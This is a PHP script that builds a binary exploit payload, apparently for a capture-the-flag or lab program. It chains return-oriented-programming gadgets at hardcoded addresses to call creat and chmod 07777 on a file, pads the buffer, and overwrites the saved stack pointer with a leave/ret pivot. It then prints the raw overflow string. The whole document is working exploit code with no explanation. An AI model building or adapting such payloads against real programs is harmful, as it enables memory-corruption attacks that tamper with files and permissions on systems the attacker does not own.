<?php
const buffer = 0x1000;
const length = 0x1000 - 0x08 * 3;
const pad    = 0xFE0;

const poprdi  = 0x00400fa3;
const poprsi  = 0x00400fa1;
const syscall = 0x00400a4b;

const str_SHA512 = 0x401002;
const O_CREAT    = 0x40;
const NR_creat   = 0x55;
const NR_chmod   = 90;

$ROP = array();

// ROP 1 : create file named SHA512
$ROP[] = array(
	poprdi, str_SHA512,     // String
	poprsi, O_CREAT, 0x0,   // Mode
	syscall, NR_creat
);

// ROP 2 : chmod it 7777
$ROP[] = array(
	poprdi, str_SHA512, // String
	poprsi, 07777, 0x0, // Mode
	syscall, NR_chmod
);

// 0x7fffffffd620..0x7fffffffe620

$payload = 'XeR12345';

$i = 0;
for($j = 0; $j < sizeof($ROP[$i]); $j++)
	$payload .= pack('Q', $ROP[$i][$j]);

$payload = str_pad($payload, pad, '1');

$payload .= pack('Q', 0x7fffffffd620);

$payload = str_pad($payload, length, 'B');
$payload = $payload . pack('Q', 0x00400dc5); // leave, ret
$payload = str_pad($payload, buffer, '3');

echo $payload;

// mov rsp, rbp
// pop rbp

// rsp = 0x7fffffffe630
// rbp = 0x7fffffffe600
